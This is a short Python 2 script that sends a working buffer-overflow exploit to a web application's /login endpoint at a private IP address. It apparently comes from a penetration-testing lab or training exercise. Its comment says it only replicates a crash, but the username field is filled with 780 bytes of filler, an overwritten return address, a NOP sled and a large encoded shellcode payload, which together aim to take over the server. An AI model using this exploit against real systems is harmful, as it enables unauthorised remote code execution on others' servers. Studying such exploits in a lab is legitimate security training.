#!/bin/python
# A script to replicate the crash of the application with HTTP requests

import socket

try:
    print "\nSending Evil Buffer..."
    # Our shell code 
    shellcode = ("\xb8\xab\x39\x2f\xbb\xdb\xc0\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"
    "\x52\x31\x43\x12\x83\xc3\x04\x03\xe8\x37\xcd\x4e\x12\xaf\x93"
    "\xb1\xea\x30\xf4\x38\x0f\x01\x34\x5e\x44\x32\x84\x14\x08\xbf"
    "\x6f\x78\xb8\x34\x1d\x55\xcf\xfd\xa8\x83\xfe\xfe\x81\xf0\x61"
    "\x7d\xd8\x24\x41\xbc\x13\x39\x80\xf9\x4e\xb0\xd0\x52\x04\x67"
    "\xc4\xd7\x50\xb4\x6f\xab\x75\xbc\x8c\x7c\x77\xed\x03\xf6\x2e"
    "\x2d\xa2\xdb\x5a\x64\xbc\x38\x66\x3e\x37\x8a\x1c\xc1\x91\xc2"
    "\xdd\x6e\xdc\xea\x2f\x6e\x19\xcc\xcf\x05\x53\x2e\x6d\x1e\xa0"
    "\x4c\xa9\xab\x32\xf6\x3a\x0b\x9e\x06\xee\xca\x55\x04\x5b\x98"
    "\x31\x09\x5a\x4d\x4a\x35\xd7\x70\x9c\xbf\xa3\x56\x38\x9b\x70"
    "\xf6\x19\x41\xd6\x07\x79\x2a\x87\xad\xf2\xc7\xdc\xdf\x59\x80"
    "\x11\xd2\x61\x50\x3e\x65\x12\x62\xe1\xdd\xbc\xce\x6a\xf8\x3b"
    "\x30\x41\xbc\xd3\xcf\x6a\xbd\xfa\x0b\x3e\xed\x94\xba\x3f\x66"
    "\x64\x42\xea\x29\x34\xec\x45\x8a\xe4\x4c\x36\x62\xee\x42\x69"
    "\x92\x11\x89\x02\x39\xe8\x5a\xed\x16\x85\x5b\x85\x64\x69\x5d"
    "\xed\xe0\x8f\x37\x01\xa5\x18\xa0\xb8\xec\xd2\x51\x44\x3b\x9f"
    "\x52\xce\xc8\x60\x1c\x27\xa4\x72\xc9\xc7\xf3\x28\x5c\xd7\x29"
    "\x44\x02\x4a\xb6\x94\x4d\x77\x61\xc3\x1a\x49\x78\x81\xb6\xf0"
    "\xd2\xb7\x4a\x64\x1c\x73\x91\x55\xa3\x7a\x54\xe1\x87\x6c\xa0"
    "\xea\x83\xd8\x7c\xbd\x5d\xb6\x3a\x17\x2c\x60\x95\xc4\xe6\xe4"
    "\x60\x27\x39\x72\x6d\x62\xcf\x9a\xdc\xdb\x96\xa5\xd1\x8b\x1e"
    "\xde\x0f\x2c\xe0\x35\x94\x5c\xab\x17\xbd\xf4\x72\xc2\xff\x98"
    "\x84\x39\xc3\xa4\x06\xcb\xbc\x52\x16\xbe\xb9\x1f\x90\x53\xb0"
    "\x30\x75\x53\x67\x30\x5c")


    # Creates the Buffer 

    filler = "A" * 780
    eip = "\x83\x0c\x09\x10"
    offset = "C" * 4
    nops = "\x90" * 10

    # Creates the web request 
    input_buffer = filler + eip + offset + nops + shellcode


    content = "username=" + input_buffer + "&password=A"

    buffer = "POST /login HTTP/1.1\r\n"
    buffer += "Host: 192.168.193.10\r\n"
    buffer += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\r\n"
    buffer += "Accept: text/html,application/xhmtl+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
    buffer += "Accept-Language: En-US,en;q=0.5\r\n"
    buffer += "Accept-Encoding: gzip, deflate\r\n"
    buffer += "Referer: http://192.168.193.10/login\r\n"
    buffer += "Connection: close\r\n"
    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += "Content-Length: "+str(len(content))+"\r\n"
    buffer += "\r\n"

    buffer += content

    # makes the connection to the web app 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect(("192.168.193.10", 80))
    s.send(buffer)

    s.close()

    print "\nDone!"

except:
    print "\nCould not connect!"




